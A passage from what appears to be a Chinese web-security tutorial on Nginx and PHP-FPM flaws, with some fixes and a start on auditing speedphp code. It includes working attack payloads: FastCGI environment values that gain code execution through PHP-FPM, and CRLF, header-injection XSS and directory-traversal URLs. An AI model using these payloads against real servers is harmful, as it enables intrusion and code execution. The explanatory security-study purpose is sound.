<li>key 小于 128 字节，value 大于 128 字节，用 <code>FCGI_NameValuePair14</code></li>
<li>key、value 均大于 128 字节，用 `FCGI_NameValuePair44</li>
</ol>
<p>举个例子，用户访问 <code>http://127.0.0.1/index.php?a=1&amp;b=2</code> ，如果 web 目录是 <code>/var/www/html</code> ，那么 Nginx 会将这个请求变成如下 key-value 对：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个数组其实就是 PHP 中 <code>$_SERVER</code>  数组的一部分，也就是 PHP 里的环境变量。但环境变量的作用不仅是填充 <code>$_SERVER</code>  数组，也是告诉 fpm：“我要执行哪个 PHP 文件”。</p>
<p>PHP-FPM 拿到 fastcgi 的数据包后，进行解析，得到上述这些环境变量。然后，执行 <code>SCRIPT_FILENAME</code>  的值指向的 PHP 文件，也就是 <code>/var/www/html/index.php</code> 。</p>
<h3 id="nginxiis7解析漏洞"><a class="markdownIt-Anchor" href="#nginxiis7解析漏洞">#</a> Nginx（IIS7）解析漏洞</h3>
<p>Nginx 和 IIS7 曾经出现过一个 PHP 相关的解析漏洞（测试环境 <code>https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability</code> ），该漏洞现象是，在用户访问 <code>http://127.0.0.1/favicon.ico/.php</code>  时，访问到的文件是 favicon.ico，但却按照.php 后缀解析了。</p>
<p>用户请求 <code>http://127.0.0.1/favicon.ico/.php</code> ，nginx 将会发送如下环境变量到 fpm 里：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正常来说， <code>SCRIPT_FILENAME</code>  的值是一个不存在的文件 <code>/var/www/html/favicon.ico/.php</code> ，是 PHP 设置中的一个选项 <code>fix_pathinfo</code>  导致了这个漏洞。PHP 为了支持 Path Info 模式而创造了 <code>fix_pathinfo</code> ，在这个选项被打开的情况下，fpm 会判断 <code>SCRIPT_FILENAME</code>  是否存在，如果不存在则去掉最后一个 <code>/</code>  及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。</p>
<p>所以，第一次 fpm 发现 <code>/var/www/html/favicon.ico/.php</code>  不存在，则去掉 <code>/.php</code> ，再判断 <code>/var/www/html/favicon.ico</code>  是否存在。显然这个文件是存在的，于是被作为 PHP 文件执行，导致解析漏洞。</p>
<p>正确的解决方法有两种，一是在 Nginx 端使用 <code>fastcgi_split_path_info</code>  将 path info 信息去除后，用 tryfiles 判断文件是否存在；二是借助 PHP-FPM 的 <code>security.limit_extensions</code>  配置项，避免其他后缀文件被解析。</p>
<h3 id="php-fpm未授权访问"><a class="markdownIt-Anchor" href="#php-fpm未授权访问">#</a> PHP-FPM 未授权访问</h3>
<p>PHP-FPM 默认监听 9000 端口，如果这个端口暴露在公网，则我们可以自己构造 fastcgi 协议，和 fpm 进行通信。</p>
<p>此时， <code>SCRIPT_FILENAME</code>  的值就格外重要了。因为 fpm 是根据这个值来执行 php 文件的，如果这个文件不存在，fpm 会直接返回 404：</p>
<p>在 fpm 某个版本之前，我们可以将 <code>SCRIPT_FILENAME</code>  的值指定为任意后缀文件，比如 <code>/etc/passwd</code> ；但后来，fpm 的默认配置中增加了一个选项 <code>security.limit_extensions</code> ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; Limits the extensions of the main script FPM will allow to parse. This can</span><br><span class="line">; prevent configuration mistakes on the web server side. You should only limit</span><br><span class="line">; FPM to .php extensions to prevent malicious users to use other extensions to</span><br><span class="line">; exectute php code.</span><br><span class="line">; Note: set an empty value to allow all extensions.</span><br><span class="line">; Default Value: .php</span><br><span class="line">;security.limit_extensions = .php .php3 .php4 .php5 .php7</span><br></pre></td></tr></table></figure>
<p>其限定了只有某些后缀的文件允许被 fpm 执行，默认是 <code>.php</code> 。所以，当我们再传入 <code>/etc/passwd</code>  的时候，将会返回 <code>Access denied.</code> ：</p>
<p>由于这个配置项的限制，如果想利用 PHP-FPM 的未授权访问漏洞，首先就得找到一个已存在的 PHP 文件。</p>
<p>万幸的是，通常使用源安装 php 的时候，服务器上都会附带一些 php 后缀的文件，我们使用 <code>find / -name &quot;*.php&quot;</code>  来全局搜索一下默认环境：</p>
<p>找到了不少。这就给我们提供了一条思路，假设我们爆破不出来目标环境的 web 目录，我们可以找找默认源安装后可能存在的 php 文件，比如 <code>/usr/local/lib/php/PEAR.php</code> 。</p>
<p>为什么我们控制 fastcgi 协议通信的内容，就能执行任意 PHP 代码呢？</p>
<p>理论上当然是不可以的，即使我们能控制 <code>SCRIPT_FILENAME</code> ，让 fpm 执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</p>
<p>PHP.INI 中有两个有趣的配置项， <code>auto_prepend_file</code>  和 <code>auto_append_file</code> 。</p>
<p><code>auto_prepend_file</code>  是告诉 PHP，在执行目标文件之前，先包含 <code>auto_prepend_file</code>  中指定的文件； <code>auto_append_file</code>  是告诉 PHP，在执行完成目标文件后，包含 <code>auto_append_file</code>  指向的文件。</p>
<p>那么就有趣了，假设我们设置 <code>auto_prepend_file</code>  为 <code>php://input</code> ，那么就等于在执行任何 php 文件前都要包含一遍 POST 的内容。所以，我们只需要把待执行的代码放在 Body 中，他们就能被执行了。（当然，还需要开启远程文件包含选项 <code>allow_url_include</code> ）</p>
<p>那么，我们怎么设置 <code>auto_prepend_file</code>  的值？</p>
<p>这又涉及到 PHP-FPM 的两个环境变量， <code>PHP_VALUE</code>  和 <code>PHP_ADMIN_VALUE</code> 。这两个环境变量就是用来设置 PHP 配置项的， <code>PHP_VALUE</code>  可以设置模式为 <code>PHP_INI_USER</code>  和 <code>PHP_INI_ALL</code>  的选项， <code>PHP_ADMIN_VALUE</code>  可以设置所有选项。（ <code>disable_functions</code>  除外，这个选项是 PHP 加载的时候就确定了，在范围内的函数直接不会被加载到 PHP 上下文中）</p>
<p>所以，我们最后传入如下环境变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,</span><br><span class="line">    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设置 <code>auto_prepend_file = php://input</code>  且 <code>allow_url_include = On</code> ，然后将我们需要执行的代码放在 Body 中，即可执行任意代码。</p>
<p>上图中用到的 EXP，就是根据之前介绍的 fastcgi 协议来编写的，代码如下：<span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vcGhpdGgwbi85NjE1ZTI0MjBmMzEwNDhmN2UzMGYzOTM3MzU2Y2Y3NQ==">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</span> 。兼容 Python2 和 Python3，方便在内网用。</p>
<h2 id="nginx-文件名逻辑漏洞"><a class="markdownIt-Anchor" href="#nginx-文件名逻辑漏洞">#</a> nginx 文件名逻辑漏洞</h2>
<p>主要原因是错误地解析了请求的 URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。</p>
<p>正常情况下（关闭 pathinfo 的情况下），只有.php 后缀的文件才会被发送给 fastcgi 解析。</p>
<p>而存在 CVE-2013-4547 的情况下，我们请求 <code>1.gif[0x20][0x00].php</code> ，这个 URI 可以匹配上正则 <code>\.php$</code> ，可以进入这个 Location 块；但进入后，Nginx 却错误地认为请求的文件是 <code>1.gif[0x20]</code> ，就设置其为 <code>SCRIPT_FILENAME</code>  的值发送给 fastcgi。</p>
<p>fastcgi 根据 <code>SCRIPT_FILENAME</code>  的值进行解析，最后造成了解析漏洞。</p>
<p>该漏洞利用条件有两个：</p>
<ol>
<li>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</li>
<li>php-fpm.conf 中的 security.limit_extensions 为空，也就是说任意后缀名都可以解析为 PHP</li>
</ol>
<p>Nginx 版本范围较大，比较好匹配，但 php-fpm.conf 的 security.limit_extensions 配置默认为 php，一般鲜有管理员允许所有类型都可以解析为 PHP</p>
<p>再举个例子，比如很多网站限制了允许访问后台的 IP：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /admin/ &#123;</span><br><span class="line">    allow 127.0.0.1;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以请求如下 URI： <code>/test[0x20]/../admin/index.php</code> ，这个 URI 不会匹配上 location 后面的 <code>/admin/</code> ，也就绕过了其中的 IP 验证；但最后请求的是 <code>/test[0x20]/../admin/index.php</code>  文件，也就是 <code>/admin/index.php</code> ，成功访问到后台。（这个前提是需要有一个目录叫 “test”：这是 Linux 系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows 下没有这个限制）</p>
<h2 id="nginx错误配置"><a class="markdownIt-Anchor" href="#nginx错误配置">#</a> nginx 错误配置</h2>
<h3 id="crlf注入漏洞"><a class="markdownIt-Anchor" href="#crlf注入漏洞">#</a> CRLF 注入漏洞</h3>
<p>下面两种情景十分常见：</p>
<ol>
<li>用户访问 <code>http://example.com/aabbcc</code> ，自动跳转到 <code>https://example.com/aabbcc</code></li>
<li>用户访问 <code>http://example.com/aabbcc</code> ，自动跳转到 <code>http://www.example.com/aabbcc</code></li>
</ol>
<p>第二个场景主要是为了统一用户访问的域名，更加有益于 SEO 优化。</p>
<p>在跳转的过程中，我们需要保证用户访问的页面不变，所以需要从 Nginx 获取用户请求的文件路径。查看 Nginx 文档，可以发现有三个表示 uri 的变量：</p>
<ol>
<li><code>$uri</code></li>
<li><code>$document_uri</code></li>
<li><code>$request_uri</code></li>
</ol>
<p>解释一下，1 和 2 表示的是解码以后的请求路径，不带参数；3 表示的是完整的 URI（没有解码）。</p>
<p>Nginx 会将 <code>$uri</code>  进行解码，导致传入 %0d%0a 即可引入换行符，造成 CRLF 注入漏洞。</p>
<p>错误的配置文件示例（原本的目的是为了让 http 的请求跳转到 https 上）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    return 302 https://$host$uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Payload:  <code>http://your-ip:8080/%0d%0aSet-Cookie:%20a=1</code> ，可注入 Set-Cookie 头。</p>
<p>如何修复这个 CRLF 漏洞？正确的做法应该是如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    return 302 https://$host$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外，由 <code>$uri</code>  导致的 CRLF 注入漏洞不仅可能出现在上述两个场景中，理论上，只要是可以设置 HTTP 头的场景都会出现这个问题。</p>
<p>利用《<span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vYm90dGxlLWNybGYtY3ZlLTIwMTYtOTk2NC5odG1s">Bottle HTTP 头注入漏洞探究</span>》中的技巧，即可构造一个 XSS 漏洞：</p>
<h3 id="bottle-http头注入"><a class="markdownIt-Anchor" href="#bottle-http头注入">#</a> bottle http 头注入</h3>
<p>只要是能设置 HTTP 返回头的地方，都存在头注入的问题。</p>
<p>其将所有设置头的地方都使用了 <code>_hval</code>  方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def _hval(value):</span><br><span class="line">    value = value if isinstance(value, unicode) else str(value)</span><br><span class="line">    if &#x27;\n&#x27; in value or &#x27;\r&#x27; in value or &#x27;\0&#x27; in value:</span><br><span class="line">        raise ValueError(&quot;Header value must not contain control characters: %r&quot; % value)</span><br><span class="line">    return value</span><br></pre></td></tr></table></figure>
<p>一旦发现 \n、\r、\0 就抛出异常。那么我们怎么复现这个漏洞呢？</p>
<p>直接使用 pip 安装老版本的 bottle 即可：  <code>pip install https://github.com/bottlepy/bottle/archive/0.12.10.zip</code></p>
<p>漏洞原理：</p>
<p><strong>设置 HTTP 头的时候没有处理换行，导致了头注入。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import bottle</span><br><span class="line">from bottle import route, run, template, request, response</span><br><span class="line"></span><br><span class="line">@route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    path = request.query.get(&#x27;path&#x27;, &#x27;https://www.leavesongs.com&#x27;)</span><br><span class="line">    return bottle.redirect(path)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bottle.debug(True)</span><br><span class="line">    run(host=&#x27;localhost&#x27;, port=8081)</span><br></pre></td></tr></table></figure>
<p>这里还是使用的 redirect，但这个漏洞和 redirect 函数没有任何关系。因为 redirect 函数是向 response 中插入一个 HTTP 头，也就是 <code>Location: xxx</code> ，所以存在头注入。</p>
<p>看看 redirect 函数的实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def redirect(url, code=None):</span><br><span class="line">    &quot;&quot;&quot; Aborts execution and causes a 303 or 302 redirect, depending on</span><br><span class="line">        the HTTP protocol version. &quot;&quot;&quot;</span><br><span class="line">    if not code:</span><br><span class="line">        code = 303 if request.get(&#x27;SERVER_PROTOCOL&#x27;) == &quot;HTTP/1.1&quot; else 302</span><br><span class="line">    res = response.copy(cls=HTTPResponse)</span><br><span class="line">    res.status = code</span><br><span class="line">    res.body = &quot;&quot;</span><br><span class="line">    res.set_header(&#x27;Location&#x27;, urljoin(request.url, url))</span><br><span class="line">    raise res&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
<p>其中使用了一个 urljoin，将当前 url 和我传入的 path 进行了一次 &quot;join&quot;，经过这个操作事情就变得很微妙了： <code>Location</code>  头一定有一个值。这种情况下，浏览器就不会渲染页面，会直接跳转到 Location 头指向的地址。也就是说，如果我要利用 CRLF 构造 XSS 的话，这里是不会触发的。</p>
<p>回想上面提到过的新浪的那个 CRLF，那个漏洞的 <code>Location</code>  是可以为空的，如果浏览器发现 <code>Location</code>  为空就不会进行跳转，进而渲染了后面注入的 HTML，造成 XSS。</p>
<h4 id="两种阻止浏览器跳转的方式"><a class="markdownIt-Anchor" href="#两种阻止浏览器跳转的方式">#</a> 两种阻止浏览器跳转的方式</h4>
<p>可以使用 \0 来阻止 PHP 返回 <code>Location</code>  头的方法。因为 PHP 的 header 函数一旦遇到 \0、\r、\n 这三个字符，就会抛出一个错误，此时 <code>Location</code>  头便不会返回，浏览器也就不会跳转了。</p>
<p>其实当时我还想出来一个方法：在 PHP 没有关闭 <code>display_errors</code>  的情况下，只要在 header 位置的前面某处构造一个错误，一旦有错误信息在 header 前被输出，header 函数也就不会执行了 —— 原因是我们不能在 HTTP 体已经输出的情况下再输出 HTTP 头。</p>
<p>法 1： 将跳转的 url 端口设为 &lt; 80</p>
<p>法 2：使用 CSP 禁止 iframe 的跳转</p>
<p>其中的法 2 利用代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: frame-src http://localhost:8081/&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;http://localhost:8081/?path=http://www.baidu.com/%0a%0dX-XSS-Protection:0%0a%0d%0a%0d&lt;script&gt;alert(location.href)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<h3 id="目录穿越漏洞"><a class="markdownIt-Anchor" href="#目录穿越漏洞">#</a> 目录穿越漏洞</h3>
<p>Nginx 在配置别名（Alias）的时候，如果忘记加 <code>/</code> ，将造成一个目录穿越漏洞。</p>
<p>错误的配置文件示例（原本的目的是为了让用户访问到 /home/ 目录下的文件）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /files &#123;</span><br><span class="line">    alias /home/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Payload:  <code>http://your-ip:8081/files../</code>  ，成功穿越到根目录：</p>
<h3 id="add_header被覆盖"><a class="markdownIt-Anchor" href="#add_header被覆盖">#</a> add_header 被覆盖</h3>
<p>Nginx 配置文件子块（server、location、if）中的 <code>add_header</code> ，将会覆盖父块中的 <code>add_header</code>  添加的 HTTP 头，造成一些安全隐患。</p>
<p>如下列代码，整站（父块中）添加了 CSP 头：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add_header Content-Security-Policy &quot;default-src &#x27;self&#x27;&quot;;</span><br><span class="line">add_header X-Frame-Options DENY;</span><br><span class="line"></span><br><span class="line">location = /test1 &#123;</span><br><span class="line">    rewrite ^(.*)$ /xss.html break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location = /test2 &#123;</span><br><span class="line">    add_header X-Content-Type-Options nosniff;</span><br><span class="line">    rewrite ^(.*)$ /xss.html break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但 <code>/test2</code>  的 location 中又添加了 <code>X-Content-Type-Options</code>  头，导致父块中的 <code>add_header</code>  全部失效：</p>
<h2 id="nginx解析漏洞"><a class="markdownIt-Anchor" href="#nginx解析漏洞">#</a> nginx 解析漏洞</h2>
<p>版本信息：</p>
<ul>
<li>Nginx 1.x 最新版</li>
<li>PHP 7.x 最新版</li>
</ul>
<p>由此可知，该漏洞与 Nginx、php 版本无关，属于用户配置不当造成的解析漏洞。</p>
<p>访问 <code>http://your-ip/uploadfiles/nginx.png</code>  和 <code>http://your-ip/uploadfiles/nginx.png/.php</code>  即可查看效果。</p>
<p>增加 <code>/.php</code>  后缀，被解析成 PHP 文件：</p>
<p>访问 <code>http://your-ip/index.php</code>  可以测试上传功能，上传代码不存在漏洞，但利用解析漏洞即可 getshell：</p>
<p><strong>利用条件：</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># php.ini</span><br><span class="line">cgi.fix_pathinfo=1</span><br><span class="line"># php-fpm.conf</span><br><span class="line">security.limit_extensions = .php .jpg</span><br></pre></td></tr></table></figure>
<p>当访问 http://127.0.0.1/test.jpg 时显示图片解析错误，当访问 http://127.0.0.1/test.jpg/test.php 时结果显示 Access denied，这个回显很奇怪，正常访问这个链接是不存在的，正常思维应该是 404，这里就需要研究下 Nginx 的解析流程了：Nginx 在收到 /test.jpg/test.php 路径时，首先判断文件类型，发现后缀是.php，便交给 php 处理，但 php 想要解析该文件时，发现并不存在，便删除掉 /test.php，去找 test.jpg，此时 test.jpg 是存在的，便要尝试解析它，但无奈后缀是.jpg，不是 php，便报错 Access denied。<br>
上面的流程中提到了一个点，就是删除 /test.php，这是 Nginx 的 “修理” 机制，由参数 cgi.fix_pathinfo 决定，当值为 1 时，便进行 “修理”。例如，文件名为 /aa.jpg/bb.png/cc.php，如果 cc.php 不存在就找 /aa.jpg/bb.png，如果还不存在就找 aa.jpg，如果存在将它视为 php 文件。<br>
到目前为止我们并没有成功利用解析漏洞，因为 php 代码并没有执行。为什么呢？<br>
因为在 PHP 的配置中没有定义降.jpg 文件中的 php 代码也解析为 php，这是在 security.limit_extensions 中定义的。由于 security.limit_extensions 的引入，漏洞难以利用。</p>
<h2 id="lnmp架构漏洞挖掘"><a class="markdownIt-Anchor" href="#lnmp架构漏洞挖掘">#</a> LNMP 架构漏洞挖掘</h2>
<p>speedphp 框架，有如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">escape</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="title function_ invoke__">escape</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="title function_ invoke__">escape</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">&amp;<span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$arg</span>)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> &amp;<span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">escape</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_replace</span>([<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>], [<span class="string">&quot;‘&quot;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;（&#x27;</span>, <span class="string">&#x27;）&#x27;</span>], <span class="variable">$arg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arg</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$trim</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$name</span>])) &#123;</span><br><span class="line">        <span class="variable">$arg</span> = <span class="variable">$_REQUEST</span>[<span class="variable">$name</span>];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="variable">$name</span>])) &#123;</span><br><span class="line">        <span class="variable">$arg</span> = <span class="variable">$_SERVER</span>[<span class="variable">$name</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$arg</span> = <span class="variable">$default</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$trim</span>) &#123;</span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$arg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$arg</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>escape 是将 GPR 中的单引号、圆括号转换成中文符号，反斜线进行转义；arg 是获取用户输入的 <code>$_REQUEST</code>  或 <code>$_SERVER</code> 。显然，这里 <code>$_SERVER</code>  变量没有经过转义，先记下这个点。</p>
<p>全局没其他值得注意的地方了，所以开始看 controller 的代码。</p>
